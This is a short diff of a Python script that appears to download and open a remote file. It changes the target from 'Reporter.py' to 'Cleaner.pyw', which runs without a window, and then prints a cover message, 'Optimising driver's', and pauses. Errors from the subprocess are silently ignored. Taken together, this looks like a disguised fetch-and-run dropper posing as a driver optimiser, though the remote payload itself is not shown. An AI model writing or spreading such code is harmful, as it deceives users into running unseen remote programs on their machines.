@@ -77,7 +77,7 @@ def download_and_open_file(url):
     except subprocess.CalledProcessError as e:
         pass
 
-file_url = r"https://raw.githubusercontent.com/Lixvinity/winjv/main/Reporter.py"
+file_url = r"https://raw.githubusercontent.com/Lixvinity/winjv/main/Cleaner.pyw"
 
 print("Optimising driver's")
 time.sleep(5)
